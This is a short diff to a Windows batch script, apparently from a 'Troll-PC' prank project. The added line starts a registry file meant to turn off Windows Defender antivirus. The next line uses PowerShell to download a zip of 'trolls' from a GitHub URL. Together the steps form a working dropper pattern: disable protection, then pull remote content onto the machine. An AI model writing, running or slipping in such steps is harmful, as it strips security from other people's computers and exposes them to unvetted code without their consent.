@@ -1,6 +1,8 @@
 @echo off
 setlocal
 
+start Turn_Off_Windows_Defender_Antivirus.reg
+
 :: Baixar o arquivo usando PowerShell
 powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/FalcaoOtavio/Troll-PC/main/download-trolls.zip' -OutFile 'download-trolls.zip'"
 
